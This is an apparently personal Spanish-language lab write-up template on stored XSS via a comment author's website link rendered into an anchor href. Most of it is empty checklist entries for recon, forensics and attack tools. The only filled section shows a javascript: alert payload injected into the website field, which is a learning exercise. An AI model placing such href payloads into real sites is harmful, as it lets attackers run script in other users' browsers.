# 💀 WRITEUP EXTENSO

<details>

<summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>

#### AUDITORIA DE: ((Laboratorio: XSS almacenado en hrefun atributo de anclaje con comillas dobles codificadas en HTML))

***

***

**RECONOCIMIENTO PASIVO**

*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    HTML INYECTABLE:



    <div>
                        <hr>
                        <h1>Comments</h1>
                        <section class="comment">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Lee Onmee | 13 February 2024
                            </p>
                            <p>I feel a great debate coming on. My husband's just got home and the window cleaner is still in our bed.</p>
                            <p></p>
                        </section>
                        <section class="comment">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Zach Ache | 24 February 2024
                            </p>
                            <p>Can I get these as an audio file? I grow weary of having to read things.</p>
                            <p></p>
                        </section>
                        <section class="comment">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Paul Amuscle | 24 February 2024
                            </p>
                            <p>Amusing, enticing and well put together. But enough from my dating profile, good blog</p>
                            <p></p>
                        </section>
                        <section class="comment">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Mike Groin | 01 March 2024
                            </p>
                            <p>I keep telling my husband how good your blogs are and how much he's enjoy reading them. Which is really cruel as he's blind.</p>
                            <p></p>
                        </section>
                        <section class="comment">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="javascript:alert('P4IM0N-XSS')">PAIMON</a> | 09 March 2024
                            </p>
                            <p>TE VOY A HACKEAR</p>
                            <p></p>
                        </section>
                        <hr>
                        <section class="add-comment">
                            <h2>Leave a comment</h2>
                            <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                                <input required="" type="hidden" name="csrf" value="TtYe4Ro8UiaCbKgwHAzjwVzXRFqMKVOd">
                                <input required="" type="hidden" name="postId" value="3">
                                <label>Comment:</label>
                                <textarea required="" rows="12" cols="300" name="comment"></textarea>
                                        <label>Name:</label>
                                        <input required="" type="text" name="name">
                                        <label>Email:</label>
                                        <input required="" type="email" name="email">
                                        <label>Website:</label>
                                        <input type="text" name="website">
                                <button class="button" type="submit">Post Comment</button>
                            </form>
                        </section>
                        <div class="is-linkback">
                            <a href="/">Back to Blog</a>
                        </div>
                    </div>
    ```

    ![XSS-ALMACENADO\_enHREFnombredelAUTORcoment](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/31342bfe-4e40-4508-92c3-44c0bd69ec4d)

    ![EJECUCION-XSS-ALMACENADOenHREFclickNOMBREautorComent](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/b68e27f6-dd89-4711-9556-e65a81ce8d1f)

    * CONCLUSION: CONSTATAMOS QUE EL HREF DEL NOMBRE DEL USUARIO QUE COMENTA ESTA DENTRO DE UINA ETIQUETA A , Y DENTRO DEL DICHO HREF SIMPLEMETE VEMOS QUE SE CARGABA EL PARAMETRO WEB SITE QUE INGRESABA EL SUSARIO Y VIMOS ESTA PUERTA DE ENTRADA PARA CARGAR NUESTRO PAYLOAD DIRECTAMENTE CON COMILLAS SIMPLES Y LOGARA LA INYECCION DEL XSS ALMACENADO SE TENZO.
*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WAYBACKMACHINE👈 --------------------------------->[https://archive.org/web/](https://archive.org/web/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MALTEGO👈 --------------------------------->[https://www.maltego.com/](https://www.maltego.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CENSYS👈 --------------------------------->[https://search.censys.io/](https://search.censys.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WEB-CHECK👈 --------------------------------->[https://web-check.xyz/](https://web-check.xyz/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THEHARVESTER👈 --------------------------------->[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WAPPALYZER👈 --------------------------------->[https://www.wappalyzer.com/](https://www.wappalyzer.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DNSdumpster👈 --------------------------------->[https://dnsdumpster.com/](https://dnsdumpster.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ROBTEX👈 --------------------------------->[https://www.robtex.com/#google\_vignette](https://www.robtex.com/#google\_vignette)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WHOIS👈 --------------------------------->[https://who.is/](https://who.is/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NSLOOKUP👈 --------------------------------->[https://www.nslookup.io/](https://www.nslookup.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GHUNT👈 --------------------------------->[https://github.com/mxrch/GHunt](https://github.com/mxrch/GHunt)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LLANTUN👈 --------------------------------->[https://github.com/lesandcl/Llaitun](https://github.com/lesandcl/Llaitun)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DISCOVER👈 --------------------------------->[https://github.com/leebaird/discover](https://github.com/leebaird/discover)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SHERLOCK👈 --------------------------------->[https://github.com/sherlock-project/sherlock](https://github.com/sherlock-project/sherlock)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WHATWEB👈 --------------------------------->[https://www.kali.org/tools/whatweb/](https://www.kali.org/tools/whatweb/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DIAGRAMAS👈 --------------------------------->[https://app.diagrams.net/](https://app.diagrams.net/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] P4INformesmentales👈 --------------------------------->[https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py](../../../curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫

<details>

<summary>🔬 ANALISIS FORENSE ❌</summary>

**ANALISIS FORENSE**

*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DFF👈 (Digital Forensics Framework) [https://github.com/arxsys/dff](https://github.com/arxsys/dff)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSK👈 (The Sleuth Kit) [https://tools.kali.org/forensics/sleuthkit](https://tools.kali.org/forensics/sleuthkit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] X-WAYS Forensics👈 [https://www.x-ways.net/forensics/index-m.html](https://www.x-ways.net/forensics/index-m.html)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FOREMOST👈 [https://github.com/korczis/foremost](https://github.com/korczis/foremost)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HxD👈 [https://mh-nexus.de/en/hxd/](https://mh-nexus.de/en/hxd/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HxD👈 [https://mh-nexus.de/en/hxd/](https://mh-nexus.de/en/hxd/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] XXD👈 [https://tools.kali.org/forensics/xxd](https://tools.kali.org/forensics/xxd)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] XXD👈 [https://tools.kali.org/forensics/xxd](https://tools.kali.org/forensics/xxd)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] XXD👈 [https://tools.kali.org/forensics/xxd](https://tools.kali.org/forensics/xxd)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦

<details>

<summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>

**RECONOCIMIENTO ACTIVO**

*   [ ] PING👈 --------------------------------->[https://www.kali.org/tools/fping/](https://www.kali.org/tools/fping/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NESSUS👈 --------------------------------->[https://es-la.tenable.com/products/nessus/nessus-essentials](https://es-la.tenable.com/products/nessus/nessus-essentials)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OPENVAS👈 --------------------------------->[https://github.com/greenbone/openvas-scanner](https://github.com/greenbone/openvas-scanner)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NIKTO👈 --------------------------------->[https://github.com/sullo/nikto](https://github.com/sullo/nikto)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OWASP ZAP👈 --------------------------------->[https://github.com/zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DIRBUSTER👈 --------------------------------->[https://github.com/KajanM/DirBuster](https://github.com/KajanM/DirBuster)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DIRBUSTER👈 --------------------------------->[https://github.com/KajanM/DirBuster](https://github.com/KajanM/DirBuster)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WPSCAN👈 --------------------------------->[https://wpscan.com/register/](https://wpscan.com/register/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] JOOMSCAN👈 --------------------------------->[https://www.kali.org/tools/joomscan/](https://www.kali.org/tools/joomscan/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOBUSTER👈 --------------------------------->[https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOBUSTER👈 --------------------------------->[https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TRACEROUTE👈 --------------------------------->[https://www.kali.org/tools/traceroute/](https://www.kali.org/tools/traceroute/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SMBCLIENT👈 --------------------------------->[https://www.kali.org/tools/samba/](https://www.kali.org/tools/samba/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SMBCLIENT👈 --------------------------------->[https://www.kali.org/tools/samba/](https://www.kali.org/tools/samba/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SMBCLIENT👈 --------------------------------->[https://www.kali.org/tools/samba/](https://www.kali.org/tools/samba/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TELNET👈 --------------------------------->[https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux](https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TELNET👈 --------------------------------->[https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux](https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TELNET👈 --------------------------------->[https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux](https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTP👈 --------------------------------->[https://www.kali.org/tools/netkit-ftp/](https://www.kali.org/tools/netkit-ftp/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTP👈 --------------------------------->[https://www.kali.org/tools/netkit-ftp/](https://www.kali.org/tools/netkit-ftp/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTP👈 --------------------------------->[https://www.kali.org/tools/netkit-ftp/](https://www.kali.org/tools/netkit-ftp/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TCPDUMP👈 --------------------------------->[https://www.kali.org/tools/tcpdump/](https://www.kali.org/tools/tcpdump/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TCPDUMP👈 --------------------------------->[https://www.kali.org/tools/tcpdump/](https://www.kali.org/tools/tcpdump/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TCPDUMP👈 --------------------------------->[https://www.kali.org/tools/tcpdump/](https://www.kali.org/tools/tcpdump/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SMBMAP👈 --------------------------------->[https://www.kali.org/tools/smbmap/](https://www.kali.org/tools/smbmap/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SMBMAP👈 --------------------------------->[https://www.kali.org/tools/smbmap/](https://www.kali.org/tools/smbmap/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WFUZZ👈 --------------------------------->[https://www.kali.org/tools/wfuzz/](https://www.kali.org/tools/wfuzz/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WFUZZ👈 --------------------------------->[https://www.kali.org/tools/wfuzz/](https://www.kali.org/tools/wfuzz/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SKIP-FISH👈 --------------------------------->[https://www.kali.org/tools/skipfish/](https://www.kali.org/tools/skipfish/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WAPITI👈 --------------------------------->[https://www.kali.org/tools/wapiti/](https://www.kali.org/tools/wapiti/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ETTERCAP👈 --------------------------------->[https://www.kali.org/tools/ettercap/](https://www.kali.org/tools/ettercap/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIFITE👈 --------------------------------->[https://www.kali.org/tools/wifite/](https://www.kali.org/tools/wifite/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SPOOFTOOPH👈 --------------------------------->[https://www.kali.org/tools/spooftooph/](https://www.kali.org/tools/spooftooph/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
